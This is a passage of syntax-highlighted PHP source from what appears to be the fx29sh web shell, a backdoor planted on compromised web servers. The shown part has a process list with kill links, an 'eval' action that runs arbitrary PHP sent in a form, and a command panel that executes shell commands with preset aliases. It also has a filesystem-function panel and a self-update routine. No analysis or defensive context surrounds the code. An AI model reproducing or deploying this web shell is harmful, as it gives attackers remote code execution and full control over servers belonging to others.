        <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$stack</span><span class="p">);</span>
        <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Image Name&quot;</span><span class="p">,</span><span class="s2">&quot;Image-Name&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Session Name&quot;</span><span class="p">,</span><span class="s2">&quot;Session-Name&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Mem Usage&quot;</span><span class="p">,</span><span class="s2">&quot;Memory-Usage&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot; KILL&quot;</span><span class="p">;</span>
        <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$stack</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
        <span class="nv">$head</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Desc</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Asc</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">))</span> <span class="p">{</span><span class="nv">$k</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
            <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
            <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
            <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;pid=&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;KILL&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$y</span><span class="p">;</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
      <span class="nb">usort</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">,</span><span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$prcs</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">);</span> <span class="p">}</span>
      <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
      <span class="nv">$tab</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$head</span><span class="p">;</span>
      <span class="nv">$tab</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$prcs</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=</span><span class="se">\&quot;</span><span class="s2">explorer</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$tab</span> <span class="k">as</span> <span class="nv">$i</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$j</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nx">is_windows</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span> <span class="k">and</span> <span class="nv">$j</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ EVAL ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;eval&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;Result of execution this PHP-code:&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$tmp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
      <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$olddir</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&amp;gt;.: PHP-code Execution :.&amp;lt;/div&amp;gt;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval_txt</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$eval_txt</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;form name=&quot;f_eval&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;eval&quot;&amp;gt;</span>
<span class="x">    &amp;lt;textarea name=&quot;eval&quot; cols=&quot;125&quot; rows=&quot;10&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$eval</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/textarea&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;submit&quot; value=&quot;Execute&quot;&amp;gt; Display in text-area &amp;lt;input type=&quot;checkbox&quot; name=&quot;eval_txt&quot; value=&quot;1&quot;</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x">&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="c1">###[ UPDATE ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;update&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29sh_getupdate</span><span class="p">(</span><span class="o">@</span><span class="nv">$confirmupdate</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;</span><span class="si">$ret</span><span class="s2">&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;new version&quot;</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=button onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&amp;confirmupdate=1&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Update now</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;tools&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29sh_tools</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;about&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29sh_about</span><span class="p">();</span> <span class="p">}</span>
<span class="p">}</span>
<span class="c1">###[ END OF ACTIONS ]###</span>
<span class="c1">#################################</span>
<span class="c1">###[ COMMANDS PANEL ]###</span>
<span class="c1">#################################</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;!-- End of Main Info --&amp;gt;</span>
<span class="x">&amp;lt;!-- Commands Panel --&amp;gt;</span>
<span class="x">&amp;lt;div id=&quot;main&quot;&amp;gt;</span>
<span class="x">    &amp;lt;div class=&quot;bartitle&quot;&amp;gt;&amp;lt;b&amp;gt;.: COMMANDS PANEL :.&amp;lt;/b&amp;gt;&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;table id=&quot;mainpanel&quot;&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th colspan=&quot;2&quot;&amp;gt;Command:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_cmd&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;cmd&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;100&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th colspan=&quot;2&quot;&amp;gt;Quick Commands:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_qcmd&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;cmd&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;select name=&quot;cmd&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/select&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th colspan=&quot;2&quot; rowspan=&quot;2&quot;&amp;gt;PHP Filesystem:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;script language=&quot;javascript&quot;&amp;gt;</span>
<span class="x">    function set_arg(txt1,txt2) {</span>
<span class="x">      document.forms.fphpfsys.phpfsysfunc.value.selected = &quot;Download&quot;;</span>
<span class="x">      document.forms.fphpfsys.arg1.value = txt1;</span>
<span class="x">      document.forms.fphpfsys.arg2.value = txt2;</span>
<span class="x">    }</span>
<span class="x">    function chg_arg(num,txt1,txt2) {</span>
<span class="x">      if (num==0) {</span>
<span class="x">        document.forms.fphpfsys.arg1.type = &quot;hidden&quot;;</span>
<span class="x">        document.forms.fphpfsys.A1.type = &quot;hidden&quot;;</span>
<span class="x">      }</span>
<span class="x">      if (num&amp;lt;=1) {</span>
<span class="x">        document.forms.fphpfsys.arg2.type = &quot;hidden&quot;;</span>
<span class="x">        document.forms.fphpfsys.A2.type = &quot;hidden&quot;;</span>
<span class="x">      }</span>
<span class="x">      if (num==2) {</span>
<span class="x">        document.forms.fphpfsys.A1.type = &quot;label&quot;;</span>
<span class="x">        document.forms.fphpfsys.A2.type = &quot;label&quot;;</span>
<span class="x">        document.forms.fphpfsys.arg1.type = &quot;text&quot;;</span>
<span class="x">        document.forms.fphpfsys.arg2.type = &quot;text&quot;;</span>
<span class="x">      }</span>
<span class="x">      document.forms.fphpfsys.A1.value = txt1 + &quot;:&quot;;</span>
<span class="x">      document.forms.fphpfsys.A2.value = txt2 + &quot;:&quot;;</span>
<span class="x">    }</span>
<span class="x">    &amp;lt;/script&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;fphpfsys&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;phpfsys&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;select name=&quot;phpfsysfunc&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$phpfsaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==@</span><span class="nv">$phpfsysfunc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option selected value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[4]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
